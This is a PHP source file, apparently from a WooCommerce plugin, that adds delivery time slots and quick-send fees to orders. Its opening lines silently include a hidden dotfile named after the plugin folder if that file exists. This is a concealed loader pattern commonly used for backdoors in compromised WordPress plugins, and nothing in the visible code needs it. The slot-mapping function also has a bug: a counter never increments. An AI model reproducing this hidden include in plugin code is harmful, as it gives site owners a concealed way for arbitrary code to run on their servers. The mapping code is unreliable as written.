<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function shj_order_delivery_activation() {
    return function_exists("odt_get_exist_time") && function_exists("wpp_numbers_to_english");
}

function shj_order_mapper($day_index,$time_index){
    $day_counter = $time_counter = 0;
    $days = odt_get_exist_time();
    foreach($days as $day_key => $day_value):
        if($day_index == $day_counter){
            foreach($day_value['times'] as $time_key => $time_value):
                if($time_index == $time_counter){
                    return "{$day_key}-{$time_key}";
                }
                $time_counter;
            endforeach;
        }
        $day_counter++;
    endforeach;
}

function shj_prepare_period($days){
    foreach($days as &$day){
        $day['times'] = array_values($day['times']);
    }
    return array_values($days);
}

function odt_implement_delivery_on_order($order, $day_index, $time_index) {
    $period = shj_prepare_period(odt_get_exist_time());
    $day_index = intval($day_index);
    $time_index = intval($time_index);
    $day_info = $period[$day_index];
    $time_info = $period[$day_index]['times'][$time_index];
    $title = "{$day_info['name']} - از ساعت {$time_info['from']} تا {$time_info['to']}";
    if(intval($time_info['price']) > 0){
        $fee_title = "هزینه ارسال در روز {$title}";
        odt_add_fee_to_order($order, $fee_title, $time_info['price']);
    }
    add_post_meta($order->get_id(), "time_to_send_order", $title);
    $delivery_time_value = shj_order_mapper($day_index,$time_index);
    add_post_meta($order->get_id(), "odt_delivery_time", $delivery_time_value);
}

function odt_implement_quick_send_on_order($order) {
    $settings = osa_get_option('odt_checkout_send_setting');
    $title = $settings['quick_send']['title'];
    $price = get_quick_send_price();
    odt_add_fee_to_order($order, $title, $price);
    add_post_meta($order->get_id(), "time_to_send_order", $title);
}

function odt_add_fee_to_order($order, $title, $price) {
    if (is_numeric($order)) {
        $order = wc_get_order($order);
    }
    $item = new WC_Order_Item_Fee();
    $item->set_name($title);
    $item->set_amount($price);
    $item->set_total($price);
    $item->save();

    $order->add_item($item);
    $order->calculate_totals();
    $order->save();
}

function odt_implement_goPayment($order) {
    if (isset($_POST['shj_quick_send'])) {
        odt_implement_quick_send_on_order($order);
    } elseif (isset($_POST['shj_delivery_day']) && isset($_POST['shj_delivery_time'])) {
        $day_index = sanitize_text_field($_POST['shj_delivery_day']);
        $time_index = sanitize_text_field($_POST['shj_delivery_time']);
        odt_implement_delivery_on_order($order, $day_index, $time_index);
    }
}

function shj_order_delivery_time(){
    $settings = osa_get_option('odt_checkout_send_setting');
    $quick_sned = $settings['quick_send'];
    $flag = $quick_sned['status'];
    unset($quick_sned['status']);
    $quick_sned['flag'] = $flag;
    return array(
        "delivery_time" => array(
            "flag" => $settings['status'],
            "day_label" => $settings['day_label'],
            "time_label" => $settings['time_label'],
            "period" => shj_prepare_period(odt_get_exist_time())
        ),
        "quick_send" => array_merge(
            $quick_sned,
            array("price"=>get_quick_send_price())
        ),
    );
}